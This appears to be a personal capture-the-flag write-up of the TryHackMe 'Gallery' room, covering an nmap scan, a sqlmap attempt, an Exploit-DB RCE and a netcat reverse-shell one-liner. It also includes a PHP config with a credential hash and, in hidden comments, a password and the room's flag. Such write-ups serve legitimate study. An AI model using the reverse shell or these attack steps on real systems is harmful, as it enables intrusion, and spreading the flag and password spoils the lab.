---
layout: post
title: THM Room - Gallery 
---

ROOM: [Gallery](https://tryhackme.com/room/gallery666)

# Nmap Scan

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

```

# Interesting findings ?
- Port 80800 interesting and Running Simple Image Gallery System

## Whats next : bruteforce directories and remember to check the source code: FAILED

```html
<!-- /.social-auth-links -->

      <!-- <p class="mb-1">
        <a href="forgot-password.html">I forgot my password</a>
      </p> -->
 ```


## Whats next : sqlmap the login page: FAILED

```bash

└─$ sqlmap -u http://10.10.52.84/gallery/login.php --form --batch --tamper=between --risk=3 --level=3

```

## Check the Exploit-Db for the CMS name there is an RCE
- [check here](https://www.exploit-db.com/exploits/50214)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


```bash

<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"XXXXX");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"XXXXX");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```
- Login to the mysql database
- Get the admin hash

## Check /var/backup
- Login as mike
- Pwn the box
<!--- b3stpassw0rdbr0xx -->
<!--- THM{af05cd30bfed67849befd546ef} -->